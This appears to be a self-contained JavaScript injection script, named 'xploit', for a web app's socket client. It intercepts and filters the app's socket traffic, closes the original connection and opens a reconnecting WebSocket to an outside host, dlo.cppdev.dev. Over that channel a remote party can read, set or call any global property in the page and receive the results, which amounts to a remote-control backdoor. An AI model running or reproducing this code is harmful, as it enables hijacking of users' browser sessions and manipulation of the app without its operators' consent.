(function(debug){
    if(globalThis.xploit)return true;
    if(debug)globalThis.DEBUG=true;

    const uid=socket.options.url.match(/=[0-9]*$/)[0].replace(/^=/,"");
    
    const xploit={
        version: 2,
        ml: socket.onMessage,
        el: socket.onError,
        dl: socket.onDisconnect,
        cl: socket.onConnect,
        ss: socket.send,
        oopt: {...socket.options},
        conf: {
            send: {
                isWhite:false,
                black:[],
                white:[],
            },
            get: {
                isWhite:false,
                black:[],
                white:[],
            },
        },
        uid,
        sock: new class StableWebSocket{
            #url="https://dlo.cppdev.dev/v2?uid="+uid; #ws;
            get ws(){return this.#ws};
            send(...args){this.#ws.send(...args)};

            constructor(){
                this.#startws();
            };
            #startws(ce=null){
                if(debug)console.log("ce",ce);
                this.#ws=new WebSocket(this.#url);
                this.#ws.onopen=e=>this.#open(e);
                this.#ws.onclose=e=>this.#startws(e);
                this.#ws.onmessage=msg=>this.#onmessage(msg);
            };
            #open(oe){
                if(debug)console.log("open",oe);
            }
            #onmessage(msg){
                if(debug)console.log("message",msg);
                this.onmessage(msg);
            };
            onmessage=e=>e;

        },
    };

    //const surl=socket.options.url,userId=surl.match(/=[0-9]*$/)[0].replace(/^=/,"");

    //globalThis.dloOOpt={...xploit.oopt};
    



    socket.onMessage=function message(m){
        if(debug)console.log("socket.onMessage",m);

        let allow=true;
        if(xploit.conf.get.isWhite&&!xploit.conf.get.white.includes(m.action))allow=false;
        if(!xploit.conf.get.isWhite&&xploit.conf.get.black.includes(m.action))allow=false;
        if(allow)xploit.ml.call(this,m);
        else if(debug)console.log("blocking event",m.action);
    };
    socket.send=function sender(m){
        if(debug)console.log("socket.send",m);

        let allow=true;
        if(xploit.conf.send.isWhite&&!xploit.conf.send.white.includes(m.action))allow=false;
        if(!xploit.conf.send.isWhite&&xploit.conf.send.black.includes(m.action))allow=false;
        if(allow)xploit.ss.call(this,m);
        else if(debug)console.log("blocking event",m.action);
        //xploit.ss.call(this,m);
    };


    socket.socket.close();

    xploit.sock.onmessage=function(msg){
        let str=msg.data;

        if(str.startsWith("access")){
            const js=("{"+str.replace(/^.*?\{/,""));
            let res=access(js);
            if(debug)console.log("< access res",res);
            xploit.sock.send("access"+JSON.stringify({json:res,string:String(res)}));
        }else if(str.startsWith("ping")){
            if(debug)console.log("> ping");
            xploit.sock.send(str.replace("ping","pong"));
        }else if(str.startsWith("pong")){
            if(debug)console.log("> pong");
        };
    }

    function access(str){
        // access objects and properties
        /*let _str=`{
            "action": ["call","test"],
            "prop": ["socket","socket","send"]
        }`;*/
        let obj=globalThis,j=JSON.parse(str);
        for(let p of j.prop.slice(0,j.prop.length-1))obj=obj[p];
        if(j.action[0]=="set")return obj[j.prop[j.prop.length-1]]=j.action[1];
        else if(j.action[0]=="call")return obj[j.prop[j.prop.length-1]](...j.action.slice(1));
        else if(j.action[0]=="get")return obj[j.prop[j.prop.length-1]]; // do something
        else return null;
    };

    if(debug)console.log("uid",uid);
    if(!debug)console.log("gebruikersnaam/wachtwoord: "+uid);
    if(!debug)console.log("%c"+uid, "color: blue; font-size: 30px; font-weight: bold;");

    if(debug)globalThis.xploit=xploit;
    return debug?xploit:xploit.version;
})();